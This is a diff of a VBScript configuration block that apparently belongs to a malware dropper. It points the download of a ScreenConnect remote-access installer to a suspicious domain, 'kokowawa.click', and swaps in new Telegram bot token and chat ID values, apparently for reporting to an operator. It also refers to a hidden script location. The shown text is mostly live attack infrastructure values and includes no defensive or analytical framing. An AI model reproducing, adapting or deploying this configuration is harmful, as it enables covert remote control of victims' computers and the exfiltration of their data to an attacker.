@@ -19,7 +19,7 @@ Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")
 ' CONFIGURATION - EDIT THESE VALUES
 '==========================================================================
 Dim sMsiUrl, sMsiPath, sTempDir, sLogFile, sBackupDir, sDataDir
-sMsiUrl    = "https://ackermantoyota.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+sMsiUrl    = "https://kokowawa.click/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 sTempDir   = oShell.ExpandEnvironmentStrings("%TEMP%")
 sMsiPath   = sTempDir & "\SC_Installer.msi"
 sLogFile   = sTempDir & "\SC_Install.log"
@@ -28,8 +28,8 @@ sDataDir   = sTempDir & "\SC_Data"
 
 ' --- TELEGRAM CONFIGURATION ---
 Dim sBotToken, sChatID
-sBotToken = "8675345681:AAG8XPocCutq5po7s9y-rz2_GKHif5_TSJM"
-sChatID   = "8008457692"
+sBotToken = "8965363679:AAGocjU08VVR4ktDaAFm8aOceU9AcetYBn4"
+sChatID   = "6341146460"
 
 ' --- HIDDEN SCRIPT LOCATION ---
 Dim sHiddenScriptPath
